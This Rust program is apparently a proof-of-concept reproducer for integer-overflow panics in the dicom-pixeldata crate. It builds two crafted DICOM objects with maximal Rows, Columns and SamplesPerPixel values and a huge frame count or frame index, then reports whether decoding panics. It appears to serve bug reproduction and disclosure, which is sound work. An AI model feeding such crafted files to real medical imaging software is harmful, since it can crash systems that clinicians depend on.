use dicom_core::{DataElement, PrimitiveValue, VR, dicom_value};
use dicom_dictionary_std::tags;
use dicom_object::{FileDicomObject, FileMetaTableBuilder, InMemDicomObject};
use dicom_pixeldata::PixelDecoder;

/// Exercises `decode_pixel_data`'s `bits_allocated == 1` bit-expansion branch
/// (native, non-encapsulated pixel data): `frame_pixels`/`frame_samples`/
/// `frame_size_all` multiply attacker-controlled `Rows`/`Columns`/
/// `SamplesPerPixel` (all legal `US` values) by an ordinary, legal
/// `NumberOfFrames`, overflowing `usize` before the existing length check
/// ever runs.
fn build_object_bits1_all_frames() -> FileDicomObject<InMemDicomObject> {
    let meta = FileMetaTableBuilder::new()
        .transfer_syntax(dicom_dictionary_std::uids::EXPLICIT_VR_LITTLE_ENDIAN)
        .media_storage_sop_class_uid(dicom_dictionary_std::uids::SECONDARY_CAPTURE_IMAGE_STORAGE)
        .media_storage_sop_instance_uid("2.25.222222222222222222222222222222222222221")
        .build()
        .unwrap();

    let mut obj = FileDicomObject::new_empty_with_meta(meta);

    obj.put_element(DataElement::new(tags::ROWS, VR::US, dicom_value!(U16, [65535])));
    obj.put_element(DataElement::new(tags::COLUMNS, VR::US, dicom_value!(U16, [65535])));
    obj.put_element(DataElement::new(
        tags::SAMPLES_PER_PIXEL,
        VR::US,
        dicom_value!(U16, [65535]),
    ));
    obj.put_element(DataElement::new(
        tags::PHOTOMETRIC_INTERPRETATION,
        VR::CS,
        PrimitiveValue::from("MONOCHROME2"),
    ));
    obj.put_element(DataElement::new(tags::BITS_ALLOCATED, VR::US, dicom_value!(U16, [1])));
    obj.put_element(DataElement::new(tags::BITS_STORED, VR::US, dicom_value!(U16, [1])));
    obj.put_element(DataElement::new(tags::HIGH_BIT, VR::US, dicom_value!(U16, [0])));
    obj.put_element(DataElement::new(
        tags::PIXEL_REPRESENTATION,
        VR::US,
        dicom_value!(U16, [0]),
    ));
    obj.put_element(DataElement::new(
        tags::NUMBER_OF_FRAMES,
        VR::IS,
        PrimitiveValue::from("600000"),
    ));
    obj.put_element(DataElement::new(
        tags::PIXEL_DATA,
        VR::OB,
        dicom_value!(U8, [0, 0, 0, 0]),
    ));

    obj
}

/// Exercises `decode_pixel_data_frame`'s `DicomValue::Primitive` "non-encoded,
/// single frame" branch: `frame_pixels`/`frame_samples`/`frame_size`/
/// `frame_offset` multiply attacker-controlled `Rows`/`Columns`/
/// `SamplesPerPixel`/`BitsAllocated` by a caller-supplied `frame: u32` with no
/// bound against `NumberOfFrames`, overflowing `usize` before the existing
/// length check ever runs.
fn build_object_primitive_frame_slice() -> FileDicomObject<InMemDicomObject> {
    let meta = FileMetaTableBuilder::new()
        .transfer_syntax(dicom_dictionary_std::uids::EXPLICIT_VR_LITTLE_ENDIAN)
        .media_storage_sop_class_uid(dicom_dictionary_std::uids::SECONDARY_CAPTURE_IMAGE_STORAGE)
        .media_storage_sop_instance_uid("2.25.222222222222222222222222222222222222222")
        .build()
        .unwrap();

    let mut obj = FileDicomObject::new_empty_with_meta(meta);

    obj.put_element(DataElement::new(tags::ROWS, VR::US, dicom_value!(U16, [65535])));
    obj.put_element(DataElement::new(tags::COLUMNS, VR::US, dicom_value!(U16, [65535])));
    obj.put_element(DataElement::new(
        tags::SAMPLES_PER_PIXEL,
        VR::US,
        dicom_value!(U16, [1]),
    ));
    obj.put_element(DataElement::new(
        tags::PHOTOMETRIC_INTERPRETATION,
        VR::CS,
        PrimitiveValue::from("MONOCHROME2"),
    ));
    obj.put_element(DataElement::new(tags::BITS_ALLOCATED, VR::US, dicom_value!(U16, [16])));
    obj.put_element(DataElement::new(tags::BITS_STORED, VR::US, dicom_value!(U16, [16])));
    obj.put_element(DataElement::new(tags::HIGH_BIT, VR::US, dicom_value!(U16, [15])));
    obj.put_element(DataElement::new(
        tags::PIXEL_REPRESENTATION,
        VR::US,
        dicom_value!(U16, [0]),
    ));
    obj.put_element(DataElement::new(
        tags::NUMBER_OF_FRAMES,
        VR::IS,
        PrimitiveValue::from("1"),
    ));
    obj.put_element(DataElement::new(
        tags::PIXEL_DATA,
        VR::OW,
        dicom_value!(U16, [0, 0]),
    ));

    obj
}

fn report(label: &str, result: std::thread::Result<dicom_pixeldata::Result<()>>) -> bool {
    match result {
        Ok(Ok(())) => {
            println!("{label}: did not reproduce - completed with no panic");
            false
        }
        Ok(Err(e)) => {
            println!("{label}: did not reproduce - returned a graceful error: {e}");
            false
        }
        Err(payload) => {
            let msg = payload
                .downcast_ref::<String>()
                .cloned()
                .or_else(|| payload.downcast_ref::<&str>().map(|s| s.to_string()))
                .unwrap_or_else(|| "<non-string panic payload>".to_string());
            println!("{label}: REPRODUCED - panicked: {msg}");
            true
        }
    }
}

fn main() {
    let obj1 = build_object_bits1_all_frames();
    let reproduced_1 = report(
        "decode_pixel_data() on BitsAllocated=1, Rows=Cols=SamplesPerPixel=65535, NumberOfFrames=600000",
        std::panic::catch_unwind(|| {
            obj1.decode_pixel_data().map(|_| ())
        }),
    );

    let obj2 = build_object_primitive_frame_slice();
    let reproduced_2 = report(
        "decode_pixel_data_frame(3_000_000_000) on Rows=Cols=65535, BitsAllocated=16",
        std::panic::catch_unwind(|| {
            obj2.decode_pixel_data_frame(3_000_000_000).map(|_| ())
        }),
    );

    if reproduced_1 || reproduced_2 {
        std::process::exit(1);
    }
}
